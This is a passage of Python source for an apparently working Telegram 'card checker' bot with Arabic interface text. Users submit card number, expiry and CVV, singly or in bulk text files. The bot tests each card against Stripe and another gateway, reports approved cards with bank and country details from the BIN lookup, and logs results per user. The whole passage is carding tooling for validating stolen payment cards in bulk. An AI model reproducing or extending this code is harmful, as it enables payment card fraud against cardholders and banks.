""", parse_mode='HTML', reply_markup=self.ui.stop_button())
            
            msg_id = start_msg.message_id
            chat_id = start_msg.chat.id
            approved_count = 0
            
            for i, card in enumerate(cards, 1):
                if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
                    bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, msg_id, parse_mode='HTML')
                    return
                
                try:
                    bot.edit_message_text(f"""
🚀 جاري الفحص 🚀
━━━━━━━━━━━━
🔄 {i}/{total}
✅ المقبولة: {approved_count}
""", chat_id, msg_id, parse_mode='HTML', reply_markup=self.ui.stop_button())
                    
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
                    loop.close()
                    
                    if approved:
                        approved_count += 1
                        bin_info = Helpers.get_bin_info(card['number'][:6])
                        bot.send_message(chat_id, f"""
✅ <b>بطاقة مقبولة</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{card['original']}</code>
<b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
<b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
<b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
""", parse_mode='HTML')
                    
                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
                    DataManager.update_usage(user_id, gate, resp)
                    time.sleep(delay)
                    
                except Exception as e:
                    print(f"Error: {e}")
            
            bot.edit_message_text(f"""
🚀 اكتمل الفحص 🚀
━━━━━━━━━━━━
✅ المقبولة: {approved_count}
❌ المرفوضة: {total - approved_count}
━━━━━━━━━━━━
🆔 Obeida Online
""", chat_id, msg_id, parse_mode='HTML')
            
        except Exception as e:
            print(f"Error: {e}")
    
    def handle_single(self, message, gate):
        if not self.check_access(message):
            return
        parts = message.text.strip().split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv")
            return
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة")
            return
        self.check_single_card(message, card, gate)
    
    def handle_mass(self, message, gate):
        if not self.check_access(message):
            return
        if message.document:
            self.handle_file_upload(message, gate)
        else:
            last = self.get_last_file(message.from_user.id)
            if last:
                cards = Helpers.extract_cards_from_text(last["content"])
                if cards:
                    bot.reply_to(message, f"📁 {last['file_name']}\n📊 {len(cards)} بطاقة")
                    self.check_multiple_cards(message, cards, gate)
                else:
                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            else:
                bot.reply_to(message, f"📁 أرسل ملف txt\nاستخدم: /{GATES[gate]['mass_command']}")
    
    def handle_file_upload(self, message, gate=None):
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
            cards = Helpers.extract_cards_from_text(content)
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
                return
            self.save_last_file(message.from_user.id, message.document.file_id, message.document.file_name, content)
            if gate is None:
                gate = DataManager.get_user_default_gate(message.from_user.id)
            bot.reply_to(message, f"📁 {message.document.file_name}\n📊 {len(cards)} بطاقة")
            self.check_multiple_cards(message, cards, gate)
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
    
    def check_last_file(self, message):
        last = self.get_last_file(message.from_user.id)
        if not last:
            bot.reply_to(message, "❌ لم ترسل أي ملف من قبل")
            return
        cards = Helpers.extract_cards_from_text(last["content"])
        if not cards:
            bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            return
        gate = DataManager.get_user_default_gate(message.from_user.id)
        self.check_multiple_cards(message, cards, gate)

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        if call.data == "stop_check":
            self.handler.handle_stop(call.message)
            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")

# ==================== خادم الويب لـ cron-job.org ====================
def run_web_server():
    """تشغيل خادم HTTP لـ cron-job.org"""
    try:
        PORT = int(os.environ.get('PORT', 10000))
        
        class BotHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK - Obeida Online Bot is running')
            
            def do_HEAD(self):
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        server = socketserver.TCPServer(("0.0.0.0", PORT), BotHandler)
        print(f"✅ Web server started on port {PORT}")
        server.serve_forever()
        
    except Exception as e:
        print(f"⚠️ Web server error: {e}")

# ==================== إعداد البوت ====================
def setup():
    DataManager.init_files()
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    # تشغيل خادم الويب في thread منفصل
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['stop'])
    def stop(m): handler.handle_stop(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['default'])
    def default(m): handler.handle_default_gate(m)
    
    @bot.message_handler(commands=['lastfile'])
    def lastfile(m): handler.check_last_file(m)
    
    @bot.message_handler(commands=['st'])
    def stripe(m): handler.handle_single(m, 'stripe')
    
    @bot.message_handler(commands=['mass'])
    def stripe_mass(m): handler.handle_mass(m, 'stripe')
    
    @bot.message_handler(commands=['chk'])
    def real(m): handler.handle_single(m, 'real')
    
    @bot.message_handler(commands=['chkm'])
    def real_mass(m): handler.handle_mass(m, 'real')
    
    @bot.message_handler(content_types=['document'])
    def doc(m): handler.handle_file_upload(m)
    
    @bot.message_handler(func=lambda m: True)
    def text(m):
        text = m.text.strip()
        if f"@{BOT_USERNAME}" in text:
            text = text.replace(f"@{BOT_USERNAME}", "").strip()
        cards = Helpers.extract_cards_from_text(text)
        if cards:
            if len(cards) == 1:
                handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
            else:
                handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
        else:
            if Helpers.get_chat_type(m.chat.id) == "private":
                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.YELLOW + "📌 الأوامر:" + Style.RESET_ALL)
    print(Fore.WHITE + "   💳 /st - فحص فردي (Stripe)" + Style.RESET_ALL)
    print(Fore.WHITE + "   📁 /mass - فحص ملف (Stripe)" + Style.RESET_ALL)
    print(Fore.WHITE + "   ✅ /chk - فحص فردي (Real Check)" + Style.RESET_ALL)
    print(Fore.WHITE + "   📁 /chkm - فحص ملف (Real Check)" + Style.RESET_ALL)
    print(Fore.WHITE + "   ⛔ /stop - إيقاف الفحص" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
    
    bot.infinity_polling()

if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
